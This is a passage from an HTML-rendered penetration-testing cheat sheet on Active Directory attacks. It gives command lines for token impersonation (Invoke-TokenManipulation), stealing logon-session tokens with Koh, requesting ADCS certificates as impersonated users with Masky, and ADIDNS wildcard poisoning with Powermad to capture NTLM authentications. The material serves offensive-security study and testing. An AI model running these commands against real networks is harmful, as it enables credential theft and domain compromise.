style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 98px;"></div><div class="CodeMirror-gutters" style="height: 148px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-token-manipulation">Token Manipulation</h3>
<h4 id="bkmrk-standard-token-imper">Standard Token Impersonation</h4>
<ul id="bkmrk-it-is-possible-to-us"><li>It is possible to use/impersonate tokens available on a machine</li>
<li>We can use <code>Invoke-TokenManipulation</code> from PowerSploit or Incognito (Meterpreter) for token impersonation</li>
<li>Administrative privileges are required to adjust token privileges</li>
<li>List all tokens</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 340px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 339.952px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#List all tokens on the machine</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-TokenManipulation</span> <span class="cm-operator">-</span><span class="cm-identifier">ShowAll</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#List all unique, usable tokens on the machine</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-TokenManipulation</span> <span class="cm-operator">-</span><span class="cm-identifier">Enumerate</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-start-a-new-process-"><li>Start a new process with a specific token</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 832px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 832.143px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Token of a user</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-TokenManipulation</span> <span class="cm-operator">-</span><span class="cm-identifier">ImpersonateUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Username</span> <span class="cm-string">"domain\user1"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Token of a process</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-TokenManipulation</span> <span class="cm-operator">-</span><span class="cm-identifier">CreateProcess</span> <span class="cm-string">"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe"</span> <span class="cm-operator">-</span><span class="cm-identifier">ProcessId</span> <span class="cm-number">500</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-token-impersonation-">Token impersonation via session leaking</h4>
<p id="bkmrk-blog-here.-basically"><a href="https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6">Blog here</a>. Basically, as long as a token is linked to a logon session (the <strong>ReferenceCount != 0</strong>), the logon session can't be closed, even if the user has logged off.<br><code>AcquireCredentialsHandle()</code> is used with a session LUID to increase the <em>ReferenceCount</em> and block the session release. Then <code>InitializeSecurityContext()</code> and <code>AcceptSecurityContext()</code> are used to negotiate a new security context, and <code>QuerySecurityContextToken()</code> get an usable token.</p>
<ul id="bkmrk-server-part"><li>Server part</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 398px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 397.857px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#List logon session</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Koh</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">list</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Monitor logon session with SID filtering</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Koh</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">monitor</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">SID</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Capture one token per SID found in new logon sessions</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Koh</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">capture</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-client-part-%28only-av"><li>Client part (only available as Cobalt Strike BOF for the moment)</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 441px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 250px; min-width: 441.286px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#List captured tokens</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">koh</span> <span class="cm-identifier">list</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#List group SIDs for a captured token</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">koh</span> <span class="cm-identifier">groups</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">LUID</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Impersonate a captured token by specifying the session LUID</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">koh</span> <span class="cm-identifier">impersonate</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">LUID</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Release all captured tokens</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">koh</span> <span class="cm-identifier">release</span> <span class="cm-identifier">all</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 250px;"></div><div class="CodeMirror-gutters" style="height: 300px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-tokens-and-adcs">Tokens and ADCS</h4>
<p id="bkmrk-with-administrative-">With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 637px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 636.714px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Masky</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">/</span><span class="cm-identifier">ca</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">CA_server_FQDN</span><span class="cm-punctuation">\</span><span class="cm-identifier">CA_name</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">template</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">template_name</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">output</span><span class="cm-operator">:</span><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">output</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-adidns-poisoning">ADIDNS Poisoning</h3>
<p id="bkmrk-how-to-deal-with-the">How to deal with the <strong>Active Directory Integrated DNS</strong> and redirect the NTLM authentications to us</p>
<ul id="bkmrk-by-default%2C-any-user"><li>By default, any user can create new ADIDNS records</li>
<li>But it is not possible to change or delete a record we are not owning</li>
<li>By default, the DNS will be used first for name resolution in the AD, and then NBT-NS, LLMNR, etc</li>
</ul><p id="bkmrk-if-the-wilcard-recor">If the <strong>wilcard record</strong> (*) doesn't exist, we can create it and all the authentications will arrive on our listener</p>
<h4 id="bkmrk-wildcard-attack-with">Wildcard attack with Powermad</h4>
<p id="bkmrk-the-char-%2A-can%27t-be-">The char <code>*</code> can't be added via DNS protocol because it will break the request. Since we are in an AD we can modify the DNS via LDAP. This is what <strong>Powermad</strong> do:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 10px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 557px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 10px; width: 10px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 379px; min-width: 557.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># get the value populated in the DNSRecord attribute of a node</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADIDNSNodeAttribute</span> <span class="cm-operator">-</span><span class="cm-identifier">Node</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-identifier">Attribute</span> <span class="cm-identifier">DNSRec</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># creates a wildcard record, sets the DNSRecord and DNSTombstoned attributes</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">New-ADIDNSNode</span> <span class="cm-operator">-</span><span class="cm-identifier">Tombstone</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span> <span class="cm-operator">-</span><span class="cm-identifier">Node</span> <span class="cm-operator">*</span> <span class="cm-operator">-</span><span class="cm-keyword">Data</span> <span class="cm-variable-2">$IP</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># enable a tombstoned record</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Enable-ADIDNSNode</span> <span class="cm-operator">-</span><span class="cm-identifier">Node</span> <span class="cm-operator">*</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># disable a node</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Disable-ADIDNSNode</span> <span class="cm-operator">-</span><span class="cm-identifier">Node</span> <span class="cm-operator">*</span></span></pre></div><div style="position: 